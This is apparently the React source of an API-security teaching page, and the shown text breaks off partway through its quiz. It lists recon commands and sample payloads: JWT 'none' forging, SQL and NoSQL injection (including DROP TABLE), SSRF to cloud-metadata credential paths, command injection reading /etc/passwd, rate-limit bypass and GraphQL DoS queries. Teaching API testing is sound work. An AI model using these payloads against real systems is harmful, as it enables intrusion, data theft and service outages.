import React, { useState } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  Tabs,
  Tab,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Chip,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  IconButton,
  Alert,
  Card,
  CardContent,
  Tooltip,
  Button,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ApiIcon from "@mui/icons-material/Api";
import SearchIcon from "@mui/icons-material/Search";
import LockIcon from "@mui/icons-material/Lock";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import SpeedIcon from "@mui/icons-material/Speed";
import DataObjectIcon from "@mui/icons-material/DataObject";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import WarningIcon from "@mui/icons-material/Warning";
import InfoIcon from "@mui/icons-material/Info";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import AdminPanelSettingsIcon from "@mui/icons-material/AdminPanelSettings";
import StorageIcon from "@mui/icons-material/Storage";
import CloudIcon from "@mui/icons-material/Cloud";
import HttpIcon from "@mui/icons-material/Http";
import DescriptionIcon from "@mui/icons-material/Description";
import CodeIcon from "@mui/icons-material/Code";
import SchemaIcon from "@mui/icons-material/Schema";
import TuneIcon from "@mui/icons-material/Tune";
import VisibilityIcon from "@mui/icons-material/Visibility";
import BlockIcon from "@mui/icons-material/Block";

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel(props: TabPanelProps) {
  const { children, value, index, ...other } = props;
  return (
    <div role="tabpanel" hidden={value !== index} {...other}>
      {value === index && <Box sx={{ pt: 3 }}>{children}</Box>}
    </div>
  );
}

// Code block component with copy functionality
function CodeBlock({ code, language = "bash" }: { code: string; language?: string }) {
  const theme = useTheme();
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: theme.palette.mode === "dark" ? "#1a1a2e" : "#1e1e1e",
        borderRadius: 2,
        position: "relative",
        overflow: "auto",
      }}
    >
      <Tooltip title={copied ? "Copied!" : "Copy"}>
        <IconButton
          size="small"
          onClick={handleCopy}
          sx={{
            position: "absolute",
            top: 8,
            right: 8,
            color: copied ? "success.main" : "grey.500",
          }}
        >
          <ContentCopyIcon fontSize="small" />
        </IconButton>
      </Tooltip>
      <Typography
        component="pre"
        sx={{
          fontFamily: "monospace",
          fontSize: "0.8rem",
          color: "#e0e0e0",
          m: 0,
          whiteSpace: "pre-wrap",
          wordBreak: "break-word",
        }}
      >
        {code}
      </Typography>
    </Paper>
  );
}

interface TopicSection {
  title: string;
  icon: React.ReactNode;
  color: string;
  description: string;
  keyPoints: string[];
  techniques?: string[];
  tools?: string[];
  tips?: string[];
  codeExample?: string;
}

// Tab 1: API Discovery & Enumeration
const discoveryTopics: TopicSection[] = [
  {
    title: "Finding API Endpoints",
    icon: <SearchIcon />,
    color: "#3b82f6",
    description: "Discover hidden and undocumented API endpoints through various reconnaissance techniques.",
    keyPoints: [
      "Check for /api/, /v1/, /v2/, /rest/, /graphql/ paths",
      "Analyze JavaScript files for hardcoded endpoints",
      "Use browser DevTools Network tab during normal usage",
      "Check mobile app traffic for API calls",
      "Search for Swagger/OpenAPI documentation",
      "Look for /docs, /swagger, /api-docs, /openapi.json",
      "Check robots.txt and sitemap.xml for API paths",
    ],
    tools: ["Burp Suite", "ffuf", "gobuster", "kiterunner", "GAP (GetAllUrls)", "LinkFinder"],
    techniques: [
      "ffuf -u https://api.target.com/FUZZ -w api-wordlist.txt",
      "Extract endpoints from JS: linkfinder -i https://target.com -o cli",
      "Check wayback machine: waybackurls target.com | grep api",
      "Enumerate with kiterunner: kr scan https://target.com -w routes.kite",
    ],
  },
  {
    title: "API Documentation Discovery",
    icon: <DescriptionIcon />,
    color: "#8b5cf6",
    description: "Find and analyze API documentation to understand available endpoints and parameters.",
    keyPoints: [
      "Swagger UI endpoints: /swagger, /swagger-ui, /swagger-ui.html",
      "OpenAPI spec files: /openapi.json, /openapi.yaml, /v3/api-docs",
      "GraphQL introspection: query { __schema { types { name } } }",
      "Postman collections in public repos or documentation",
      "WADL files for SOAP/REST: /application.wadl",
      "API Blueprint files: /api.apib, /blueprint",
    ],
    tools: ["Swagger Editor", "Postman", "GraphQL Voyager", "Insomnia"],
    tips: [
      "Always check if documentation is outdated vs actual implementation",
      "Undocumented endpoints often lack proper security controls",
      "Look for debug/test endpoints left in production",
      "Check for different documentation versions (/v1/docs vs /v2/docs)",
    ],
  },
  {
    title: "API Versioning & Technology Detection",
    icon: <CodeIcon />,
    color: "#10b981",
    description: "Identify API technologies, versions, and frameworks to tailor your testing approach.",
    keyPoints: [
      "Version in URL path: /api/v1/, /api/v2/",
      "Version in headers: Accept: application/vnd.api+json;version=2",
      "Version in query params: ?version=2",
      "Detect framework from error messages and headers",
      "Check Server, X-Powered-By, X-AspNet-Version headers",
      "Analyze JSON structure for framework patterns",
    ],
    techniques: [
      "Try accessing older API versions for deprecated insecure endpoints",
      "Check if v1 has less security than v2",
      "Look for version rollback vulnerabilities",
      "Test version parameter tampering",
    ],
  },
];

// Tab 2: Authentication Testing
const authTopics: TopicSection[] = [
  {
    title: "API Key Security",
    icon: <VpnKeyIcon />,
    color: "#ef4444",
    description: "Test API key implementation for common vulnerabilities and misconfigurations.",
    keyPoints: [
      "Check if API keys are transmitted securely (HTTPS only)",
      "Test for API key exposure in URLs, logs, or error messages",
      "Verify key rotation and revocation mechanisms",
      "Check for overly permissive key scopes",
      "Test if keys can be used from different IPs/origins",
      "Look for hardcoded keys in client-side code",
    ],
    techniques: [
      "Search JS files: grep -r 'api_key\\|apikey\\|api-key' .",
      "Check response headers for leaked keys",
      "Test key in different contexts (header vs query param)",
      "Attempt to use expired or revoked keys",
    ],
    tips: [
      "Many APIs accept keys in multiple places - test all locations",
      "Check if removing the key entirely allows access",
      "Test with malformed keys for information disclosure",
    ],
    codeExample: `# Common API key locations to test
curl -H "X-API-Key: <key>" https://api.target.com/endpoint
curl -H "Authorization: ApiKey <key>" https://api.target.com/endpoint
curl "https://api.target.com/endpoint?api_key=<key>"
curl -H "X-Api-Token: <key>" https://api.target.com/endpoint`,
  },
  {
    title: "JWT Attacks",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Exploit common JWT implementation flaws for authentication bypass.",
    keyPoints: [
      "Algorithm confusion: Change RS256 to HS256",
      "Algorithm none attack: Set alg to 'none'",
      "Weak secret keys vulnerable to brute force",
      "JWT header injection via jku, jwk, kid parameters",
      "Expired token acceptance",
      "Missing signature verification",
      "Sensitive data exposure in payload",
    ],
    tools: ["jwt_tool", "jwt.io", "hashcat", "Burp JWT Editor"],
    techniques: [
      "jwt_tool -t https://api.target.com -rh 'Authorization: Bearer <token>' -M at",
      "Change 'alg' to 'none' and remove signature",
      "Crack weak secrets: hashcat -a 0 -m 16500 jwt.txt wordlist.txt",
      "Inject JWKS URL via jku header parameter",
    ],
    codeExample: `# JWT None algorithm attack
# Original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.signature

# Attack: Change header to {"alg":"none","typ":"JWT"}
# Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

# Note: Remove signature but keep trailing dot`,
  },
  {
    title: "OAuth 2.0 Vulnerabilities",
    icon: <LockIcon />,
    color: "#8b5cf6",
    description: "Test OAuth implementations for authorization bypass and token theft.",
    keyPoints: [
      "Open redirect in redirect_uri parameter",
      "Authorization code interception/replay",
      "CSRF in OAuth flow (missing state parameter)",
      "Scope manipulation and privilege escalation",
      "Token leakage via Referer header",
      "Client secret exposure in mobile/SPA apps",
      "PKCE bypass attempts",
    ],
    techniques: [
      "Test redirect_uri: https://evil.com, subdomain takeover, path traversal",
      "Reuse authorization codes multiple times",
      "Remove or tamper with state parameter",
      "Request additional scopes not granted to the app",
      "Test implicit flow for token in URL fragment",
    ],
    tips: [
      "Check for token in URL - can leak via Referer",
      "Try downgrading from code flow to implicit",
      "Test if refresh tokens can be used across clients",
    ],
  },
  {
    title: "Session & Token Management",
    icon: <HttpIcon />,
    color: "#06b6d4",
    description: "Test API session handling and token lifecycle security.",
    keyPoints: [
      "Token expiration and refresh mechanisms",
      "Concurrent session handling",
      "Token revocation on logout/password change",
      "Session fixation vulnerabilities",
      "Token entropy and predictability",
      "Secure transmission (HTTPS, secure cookies)",
    ],
    techniques: [
      "Use old tokens after logout - should be invalidated",
      "Test token after password change",
      "Analyze token entropy with Burp Sequencer",
      "Check for session tokens in URLs",
      "Test token reuse across different user agents",
    ],
  },
];

// Tab 3: Authorization (BOLA/IDOR)
const authzTopics: TopicSection[] = [
  {
    title: "BOLA/IDOR Detection",
    icon: <AdminPanelSettingsIcon />,
    color: "#ef4444",
    description: "Broken Object Level Authorization - accessing other users' data by manipulating identifiers.",
    keyPoints: [
      "Test all endpoints with object IDs (user_id, order_id, etc.)",
      "Try sequential IDs: 1, 2, 3...",
      "Try UUIDs from other users if obtainable",
      "Check batch/bulk endpoints for mass data access",
      "Test GraphQL queries with different IDs",
      "Look for ID references in nested objects",
    ],
    techniques: [
      "Swap user IDs in: /api/users/{id}/profile",
      "Test: /api/orders/123 → /api/orders/124",
      "Enumerate: GET /api/documents/1 through /api/documents/1000",
      "Check if UUIDs are actually validated vs just checked for format",
    ],
    codeExample: `# BOLA/IDOR Testing with Burp Intruder or ffuf
# Step 1: Identify endpoints with object references
GET /api/v1/users/1001/orders
GET /api/v1/documents/abc-123-def

# Step 2: Enumerate with your user's token
ffuf -u https://api.target.com/users/FUZZ/profile \\
     -w ids.txt -H "Authorization: Bearer <your_token>" \\
     -mc 200 -o results.json

# Step 3: Check for data belonging to other users`,
    tips: [
      "Always test with two accounts - compare what each can access",
      "Check if DELETE/PUT also vulnerable, not just GET",
      "Look for indirect references (e.g., filename instead of ID)",
    ],
  },
  {
    title: "BFLA - Function Level Authorization",
    icon: <SecurityIcon />,
    color: "#dc2626",
    description: "Broken Function Level Authorization - accessing admin or privileged functions.",
    keyPoints: [
      "Access admin endpoints as regular user",
      "Test HTTP method switching (GET→POST→PUT→DELETE)",
      "Change user role in request body",
      "Access internal/debug endpoints",
      "Test admin API paths guessing",
    ],
    techniques: [
      "Try: /api/admin/users, /api/internal/config",
      "Change role parameter: {'role': 'admin'}",
      "Add admin parameters: ?admin=true, ?debug=1",
      "Test OPTIONS to discover allowed methods",
      "Check for different auth requirements per method",
    ],
    codeExample: `# Testing function-level authorization
# As regular user, try admin endpoints:
curl -X GET https://api.target.com/api/admin/users \\
     -H "Authorization: Bearer <regular_user_token>"

# Try method switching
curl -X DELETE https://api.target.com/api/users/123 \\
     -H "Authorization: Bearer <regular_user_token>"

# Try role elevation in request body
curl -X PUT https://api.target.com/api/users/me \\
     -H "Authorization: Bearer <token>" \\
     -d '{"role": "admin", "is_superuser": true}'`,
  },
  {
    title: "Horizontal vs Vertical Privilege Escalation",
    icon: <TuneIcon />,
    color: "#f59e0b",
    description: "Understanding and testing different types of privilege escalation in APIs.",
    keyPoints: [
      "Horizontal: Access same-level resources of other users",
      "Vertical: Escalate to higher privilege levels",
      "Context-dependent access control bypass",
      "Multi-tenant isolation failures",
      "Resource ownership manipulation",
    ],
    techniques: [
      "Horizontal: Change user_id/account_id in requests",
      "Vertical: Access /admin, change role claims, manipulate permissions",
      "Test tenant isolation: Add X-Tenant-ID or change org_id",
      "Check if deleting resources works across accounts",
    ],
    tips: [
      "Document the permission model before testing",
      "Test edge cases: empty IDs, null values, special characters",
      "Check if caching bypasses authorization checks",
    ],
  },
];

// Tab 4: Injection Attacks
const injectionTopics: TopicSection[] = [
  {
    title: "SQL Injection in APIs",
    icon: <StorageIcon />,
    color: "#ef4444",
    description: "SQL injection through API parameters, JSON bodies, and headers.",
    keyPoints: [
      "Test all input points: query params, JSON body, headers",
      "JSON injection: {\"id\": \"1 OR 1=1\"}",
      "Array parameters: ?id[]=1&id[]=2 OR 1=1",
      "Order by injection in sorting parameters",
      "Filter/search parameter injection",
    ],
    tools: ["SQLMap", "Burp Suite", "Ghauri"],
    techniques: [
      "sqlmap -u 'https://api.target.com/users?id=1' --batch",
      "Test JSON: {\"search\": \"test' OR '1'='1\"}",
      "Order by: ?sort=name,1;DROP TABLE users--",
      "In filters: ?filter={\"status\": {\"$ne\": null}}",
    ],
    codeExample: `# SQL Injection in JSON body
POST /api/search HTTP/1.1
Content-Type: application/json

{"query": "test' UNION SELECT username,password FROM users--"}

# In array parameters
GET /api/items?category[]=1&category[]=2 UNION SELECT * FROM secrets--

# In sorting/ordering
GET /api/users?sort=created_at;SELECT pg_sleep(5)--`,
  },
  {
    title: "NoSQL Injection",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Injection attacks against MongoDB, CouchDB, and other NoSQL databases.",
    keyPoints: [
      "MongoDB operator injection: $gt, $ne, $regex, $where",
      "JSON injection in query objects",
      "JavaScript injection via $where operator",
      "Array injection for operator bypass",
      "Blind NoSQL injection via timing",
    ],
    techniques: [
      "Replace value with object: {\"username\": {\"$ne\": \"\"}}",
      "Regex extraction: {\"password\": {\"$regex\": \"^a\"}}",
      "In URL: ?username[$ne]=&password[$ne]=",
      "JavaScript: {\"$where\": \"this.password.match(/^a/)\"}",
    ],
    codeExample: `# NoSQL injection examples
# Authentication bypass
POST /api/login
{"username": {"$ne": ""}, "password": {"$ne": ""}}

# Data extraction with regex
POST /api/users/search
{"password": {"$regex": "^admin"}}

# In query parameters
GET /api/users?username[$gt]=&password[$gt]=`,
  },
  {
    title: "SSRF via API Parameters",
    icon: <CloudIcon />,
    color: "#8b5cf6",
    description: "Server-Side Request Forgery through URL parameters and webhook configurations.",
    keyPoints: [
      "URL parameters: ?url=, ?callback=, ?redirect=",
      "Webhook/callback URLs in API configurations",
      "File import from URL features",
      "PDF generation with external resources",
      "Image/avatar URL fetching",
      "Cloud metadata access: 169.254.169.254",
    ],
    techniques: [
      "Test: ?url=http://127.0.0.1:8080/admin",
      "Cloud metadata: ?url=http://169.254.169.254/latest/meta-data/",
      "Port scanning: ?url=http://internal-host:PORT",
      "Protocol smuggling: ?url=file:///etc/passwd",
    ],
    codeExample: `# SSRF through API webhook configuration
POST /api/webhooks
{
  "callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# SSRF in file import
POST /api/import
{
  "source_url": "http://internal-service:8080/admin"
}

# DNS rebinding bypass
{
  "url": "http://attacker-controlled-domain.com"  
}
# (DNS resolves to internal IP after first check)`,
    tips: [
      "Try different URL schemes: http, https, file, gopher, dict",
      "Use DNS rebinding for IP-based filters",
      "Check for partial URL validation bypass",
    ],
  },
  {
    title: "Command & Header Injection",
    icon: <BugReportIcon />,
    color: "#dc2626",
    description: "OS command injection and HTTP header injection through API inputs.",
    keyPoints: [
      "Command injection in processing parameters",
      "File conversion/processing endpoints",
      "Report generation features",
      "Log injection via API inputs",
      "Header injection via parameter reflection",
    ],
    techniques: [
      "Test: {\"filename\": \"test; whoami\"}",
      "Newline injection: {\"header\": \"value\\r\\nX-Injected: true\"}",
      "In file operations: ?file=test.pdf|cat /etc/passwd",
      "Email parameter: test@test.com%0aBcc:attacker@evil.com",
    ],
  },
];

// Tab 5: Data Exposure
const dataTopics: TopicSection[] = [
  {
    title: "Excessive Data Exposure",
    icon: <VisibilityIcon />,
    color: "#ef4444",
    description: "APIs returning more data than necessary, exposing sensitive information.",
    keyPoints: [
      "Check all response fields for sensitive data",
      "Look for: passwords, tokens, PII, internal IDs",
      "Compare mobile app vs web app responses",
      "Test verbose error messages",
      "Check debug parameters: ?debug=true, ?verbose=1",
      "Analyze nested objects for hidden data",
    ],
    techniques: [
      "Compare full response vs what UI displays",
      "Request user profile - check for password hashes",
      "Look for internal fields: _id, internal_notes, etc.",
      "Check if filtering is client-side only",
    ],
    tips: [
      "Use jq to analyze JSON responses: curl ... | jq .",
      "Look for fields like: token, secret, key, password, hash",
      "Check if ?fields= parameter exposes restricted data",
    ],
    codeExample: `# Check for excessive data in responses
GET /api/users/me

# Vulnerable response:
{
  "id": 123,
  "username": "john",
  "email": "john@example.com",
  "password_hash": "$2b$12$...",  // Shouldn't be here!
  "api_key": "sk_live_...",       // Shouldn't be here!
  "internal_notes": "VIP customer",
  "ssn": "123-45-6789"            // PII exposure
}`,
  },
  {
    title: "Mass Assignment",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Modifying object properties that should be read-only by including them in requests.",
    keyPoints: [
      "Add extra fields to update requests",
      "Try modifying: role, is_admin, permissions, balance",
      "Check for writeable fields in GET responses",
      "Test nested object property injection",
      "Look for fields in documentation marked read-only",
    ],
    techniques: [
      "Add admin fields: {\"name\": \"test\", \"role\": \"admin\"}",
      "Modify balance: {\"amount\": 100, \"balance\": 999999}",
      "Change ownership: {\"user_id\": 1, \"owner_id\": 2}",
      "Inject nested: {\"profile\": {\"verified\": true}}",
    ],
    codeExample: `# Mass Assignment attack
# Normal update request:
PUT /api/users/123
{"name": "John", "email": "john@example.com"}

# Attack - add privileged fields:
PUT /api/users/123
{
  "name": "John",
  "email": "john@example.com",
  "role": "admin",
  "is_verified": true,
  "account_balance": 99999,
  "permissions": ["read", "write", "delete", "admin"]
}`,
  },
  {
    title: "Information Disclosure",
    icon: <InfoIcon />,
    color: "#8b5cf6",
    description: "Extracting sensitive information from error messages, headers, and metadata.",
    keyPoints: [
      "Verbose error messages with stack traces",
      "Database error messages revealing schema",
      "Server version in headers",
      "Debug endpoints left enabled",
      "API documentation with internal details",
      "Timing-based information disclosure",
    ],
    techniques: [
      "Trigger errors with invalid input types",
      "Send malformed JSON/XML",
      "Request non-existent resources for error details",
      "Check /debug, /status, /health, /metrics endpoints",
      "Analyze timing differences for valid vs invalid data",
    ],
  },
];

// Tab 6: Rate Limiting & DoS
const rateLimitTopics: TopicSection[] = [
  {
    title: "Rate Limit Bypass Techniques",
    icon: <SpeedIcon />,
    color: "#ef4444",
    description: "Circumventing API rate limiting and throttling mechanisms.",
    keyPoints: [
      "IP rotation via proxies or X-Forwarded-For",
      "User-Agent rotation",
      "API key rotation (if multiple available)",
      "Endpoint variation: /api/users vs /api/Users",
      "HTTP method variation: GET vs POST",
      "Parameter pollution to create unique requests",
    ],
    techniques: [
      "Add X-Forwarded-For: 127.0.0.1 header",
      "Try X-Real-IP, X-Originating-IP, X-Remote-IP",
      "URL case variation: /API/endpoint",
      "Add dummy parameters: ?_=timestamp",
      "Use HTTP/2 for parallel requests",
    ],
    codeExample: `# Rate limit bypass attempts
# IP spoofing headers
curl -H "X-Forwarded-For: 1.2.3.4" https://api.target.com/endpoint
curl -H "X-Real-IP: 5.6.7.8" https://api.target.com/endpoint
curl -H "X-Originating-IP: 9.10.11.12" https://api.target.com/endpoint

# Endpoint variations
/api/v1/login
/Api/V1/Login
/api/v1/login/
/api/v1/login?dummy=1

# Race condition with parallel requests
for i in {1..100}; do curl -s https://api.target.com/endpoint & done`,
  },
  {
    title: "Resource Exhaustion",
    icon: <BlockIcon />,
    color: "#dc2626",
    description: "Testing for denial of service through resource-intensive operations.",
    keyPoints: [
      "Large payload uploads",
      "Deeply nested JSON structures",
      "Regex DoS (ReDoS) in search parameters",
      "Expensive database queries",
      "File processing without limits",
      "GraphQL query complexity attacks",
    ],
    techniques: [
      "Send very large JSON body (megabytes)",
      "Deep nesting: {\"a\":{\"a\":{\"a\":...}}}",
      "Long strings in search: ?search=aaaa...×10000",
      "Many concurrent connections",
      "Request very large result sets: ?limit=999999",
    ],
    tips: [
      "Document rate limits and thresholds",
      "Test during off-peak hours with permission",
      "Be careful not to impact production services",
    ],
  },
  {
    title: "Batch & Bulk Endpoint Abuse",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Exploiting batch operations for data enumeration and bypass.",
    keyPoints: [
      "Batch endpoints may bypass rate limits",
      "Mass data retrieval via batch queries",
      "Batch operations for IDOR at scale",
      "GraphQL batching for parallel attacks",
    ],
    techniques: [
      "POST /api/batch [{\"id\": 1}, {\"id\": 2}, ...]",
      "GraphQL: [{query1}, {query2}, ...] in single request",
      "Test batch size limits",
      "Enumerate data via batch IDOR",
    ],
    codeExample: `# Batch endpoint abuse
POST /api/batch
[
  {"method": "GET", "path": "/users/1"},
  {"method": "GET", "path": "/users/2"},
  {"method": "GET", "path": "/users/3"},
  // ... hundreds more
]

# GraphQL batching
POST /graphql
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]`,
  },
];

// Tab 7: GraphQL Specific
const graphqlTopics: TopicSection[] = [
  {
    title: "GraphQL Introspection",
    icon: <SchemaIcon />,
    color: "#e535ab",
    description: "Using GraphQL introspection to discover the entire API schema.",
    keyPoints: [
      "Introspection reveals all types, queries, mutations",
      "Find hidden or deprecated fields",
      "Discover internal-only operations",
      "Build schema documentation from introspection",
    ],
    tools: ["GraphQL Voyager", "InQL (Burp)", "graphql-cop", "Altair GraphQL Client"],
    codeExample: `# Full introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name } }
        type { name kind }
      }
    }
  }
}

# Simplified type discovery
query { __schema { types { name } } }

# Field discovery for a type
query { __type(name: "User") { fields { name } } }`,
  },
  {
    title: "GraphQL Injection & IDOR",
    icon: <BugReportIcon />,
    color: "#ef4444",
    description: "SQL injection, IDOR, and authorization bypass in GraphQL endpoints.",
    keyPoints: [
      "Injection in query arguments",
      "IDOR through ID arguments",
      "Authorization bypass in nested queries",
      "Batched queries for enumeration",
      "Mutation parameter manipulation",
    ],
    techniques: [
      "Test ID fields: query { user(id: \"1\") { ... } }",
      "SQL injection: query { user(id: \"1' OR '1'='1\") { ... } }",
      "Access nested private data through relationships",
      "Batch enumeration: [{query: user(1)}, {query: user(2)}...]",
    ],
    codeExample: `# IDOR in GraphQL
query {
  user(id: "other-user-id") {
    email
    password
    creditCards { number }
  }
}

# Injection attempt
query {
  searchUsers(name: "admin' OR '1'='1") {
    id
    email
  }
}

# Accessing private fields via relationships
query {
  publicPost(id: "1") {
    author {
      privateEmail  # May bypass direct user query auth
      internalNotes
    }
  }
}`,
  },
  {
    title: "GraphQL DoS Attacks",
    icon: <SpeedIcon />,
    color: "#f59e0b",
    description: "Denial of service through query complexity and depth attacks.",
    keyPoints: [
      "Deeply nested queries",
      "Circular relationship exploitation",
      "Alias-based query multiplication",
      "Large batch queries",
      "Field duplication attacks",
    ],
    techniques: [
      "Nest queries to maximum depth",
      "Use aliases to repeat expensive operations",
      "Exploit circular references: user→posts→author→posts→...",
      "Request all fields on large collections",
    ],
    codeExample: `# Depth attack - deeply nested query
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends { email }
          }
        }
      }
    }
  }
}

# Alias attack - multiply operations
query {
  a1: user(id: 1) { expensive_field }
  a2: user(id: 1) { expensive_field }
  a3: user(id: 1) { expensive_field }
  # ... repeat 1000 times
}

# Circular reference abuse
query {
  user {
    posts {
      author {
        posts {
          author {
            posts { title }
          }
        }
      }
    }
  }
}`,
    tips: [
      "Check for query depth limits",
      "Test query complexity/cost analysis",
      "Look for timeout configurations",
    ],
  },
];

// Tab 8: Testing Checklist
const checklistItems = [
  {
    category: "Discovery & Recon",
    color: "#3b82f6",
    items: [
      "Enumerate all API endpoints",
      "Find API documentation (Swagger/OpenAPI)",
      "Identify API versions and test all",
      "Analyze JavaScript for hidden endpoints",
      "Check for GraphQL introspection",
      "Identify authentication mechanisms",
    ],
  },
  {
    category: "Authentication",
    color: "#8b5cf6",
    items: [
      "Test for default/weak credentials",
      "Test JWT algorithm confusion",
      "Test JWT secret brute force",
      "Check token expiration handling",
      "Test OAuth redirect_uri validation",
      "Verify logout invalidates tokens",
      "Test MFA bypass techniques",
    ],
  },
  {
    category: "Authorization",
    color: "#ef4444",
    items: [
      "Test BOLA/IDOR on all endpoints",
      "Test horizontal privilege escalation",
      "Test vertical privilege escalation",
      "Check admin endpoint access",
      "Test multi-tenant isolation",
      "Verify role-based access controls",
    ],
  },
  {
    category: "Input Validation",
    color: "#f59e0b",
    items: [
      "Test SQL injection in all parameters",
      "Test NoSQL injection",
      "Test command injection",
      "Test SSRF via URL parameters",
      "Test for mass assignment",
      "Test XSS in API responses",
    ],
  },
  {
    category: "Data Security",
    color: "#10b981",
    items: [
      "Check for excessive data exposure",
      "Analyze error messages for info leak",
      "Test debug endpoints",
      "Check for sensitive data in logs",
      "Verify PII handling",
      "Test data export features",
    ],
  },
  {
    category: "Rate Limiting & Availability",
    color: "#06b6d4",
    items: [
      "Test rate limiting implementation",
      "Attempt rate limit bypass",
      "Test resource exhaustion",
      "Check for GraphQL complexity limits",
      "Test batch endpoint abuse",
      "Verify timeout configurations",
    ],
  },
];

const tabSections = [
  { label: "Discovery", icon: <SearchIcon />, color: "#3b82f6" },
  { label: "Authentication", icon: <VpnKeyIcon />, color: "#8b5cf6" },
  { label: "Authorization", icon: <AdminPanelSettingsIcon />, color: "#ef4444" },
  { label: "Injection", icon: <BugReportIcon />, color: "#f59e0b" },
  { label: "Data Exposure", icon: <VisibilityIcon />, color: "#10b981" },
  { label: "Rate Limits", icon: <SpeedIcon />, color: "#06b6d4" },
  { label: "GraphQL", icon: <SchemaIcon />, color: "#e535ab" },
  { label: "Checklist", icon: <CheckCircleIcon />, color: "#ec4899" },
];

const ACCENT_COLOR = "#3b82f6";
const QUIZ_QUESTION_COUNT = 10;

const selectRandomQuestions = (questions: QuizQuestion[], count: number) =>
  [...questions].sort(() => Math.random() - 0.5).slice(0, count);

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Discovery",
    question: "The primary goal of API discovery is to:",
    options: [
      "Map endpoints and attack surface",
      "Exploit vulnerabilities immediately",
      "Disable authentication",
      "Generate the final report",
    ],
    correctAnswer: 0,
    explanation: "Discovery identifies endpoints, versions, and technologies to guide testing.",
  },
  {
    id: 2,
    topic: "Discovery",
    question: "A common OpenAPI specification file is:",
    options: ["/openapi.json", "/robots.txt", "/manifest.json", "/favicon.ico"],
    correctAnswer: 0,
    explanation: "OpenAPI specs are often exposed at /openapi.json or similar paths.",
  },
  {
    id: 3,
    topic: "GraphQL",
    question: "GraphQL introspection typically starts with:",
    options: ["{ __schema {", "{ __types {", "{ query {", "{ introspect {"],
    correctAnswer: 0,
    explanation: "The __schema field is used to introspect GraphQL schemas.",
  },
  {
    id: 4,
    topic: "Authentication",
    question: "API keys in URLs are risky because:",
    options: ["They can leak in logs and referrers", "They are always hashed", "They enable MFA", "They rotate automatically"],
    correctAnswer: 0,
    explanation: "URLs are logged and shared, exposing keys.",
  },
  {
    id: 5,
    topic: "JWT",
    question: "Setting JWT alg to none can lead to:",
    options: ["Signature bypass", "Token encryption", "Token expiry", "CORS errors"],
    correctAnswer: 0,
    explanation: "alg=none can allow unsigned tokens if not validated.",
  },
  {
    id: 6,
    topic: "JWT",
    question: "RS256 to HS256 confusion can allow:",
    options: ["Signing with a public key", "Token expiration", "TLS downgrade", "CSRF"],
    correctAnswer: 0,
    explanation: "HS256 accepts a shared secret, which can be the public key if misused.",
  },
  {
    id: 7,
    topic: "OAuth",
    question: "The OAuth state parameter protects against:",
    options: ["CSRF", "SQL injection", "XSS", "Brute force"],
    correctAnswer: 0,
    explanation: "State binds the OAuth flow to a user session.",
  },
  {
    id: 8,
    topic: "OAuth",
    question: "PKCE primarily protects against:",
    options: ["Authorization code interception", "SSRF", "SQL injection", "XSS"],
    correctAnswer: 0,
    explanation: "PKCE prevents stolen auth codes from being redeemed.",
  },
  {
    id: 9,
    topic: "Authorization",
    question: "BOLA/IDOR occurs when:",
    options: ["Object access is not properly authorized", "Passwords are weak", "Tokens are short", "TLS is missing"],
    correctAnswer: 0,
    explanation: "BOLA allows access to other users' objects by changing IDs.",
  },
  {
    id: 10,
    topic: "Authorization",
    question: "BFLA is:",
    options: ["Accessing privileged functions without authorization", "Brute force login", "Missing HTTPS", "SQL injection"],
    correctAnswer: 0,
    explanation: "BFLA is broken function-level authorization.",
  },
  {
    id: 11,
    topic: "Authorization",
    question: "BOPLA refers to:",
    options: ["Unauthorized access to object properties", "Broken login flow", "Proxy configuration", "SSL errors"],
    correctAnswer: 0,
    explanation: "BOPLA is broken object property level authorization.",
  },
  {
    id: 12,
    topic: "Authorization",
    question: "Mass assignment vulnerabilities allow:",
    options: ["Setting unintended fields via APIs", "Faster queries", "Encrypted payloads", "Lower latency"],
    correctAnswer: 0,
    explanation: "Attackers can set properties not intended to be writable.",
  },
  {
    id: 13,
    topic: "Data Exposure",
    question: "Excessive data exposure means:",
    options: ["APIs return more fields than needed", "APIs have short responses", "Responses are cached", "TLS is used"],
    correctAnswer: 0,
    explanation: "Sensitive fields may be included in responses unnecessarily.",
  },
  {
    id: 14,
    topic: "Rate Limiting",
    question: "Rate limiting should be enforced:",
    options: ["Per user or token, not just IP", "Only for admins", "Only on GET", "Only in clients"],
    correctAnswer: 0,
    explanation: "Per-user limits reduce abuse from shared IPs.",
  },
  {
    id: 15,
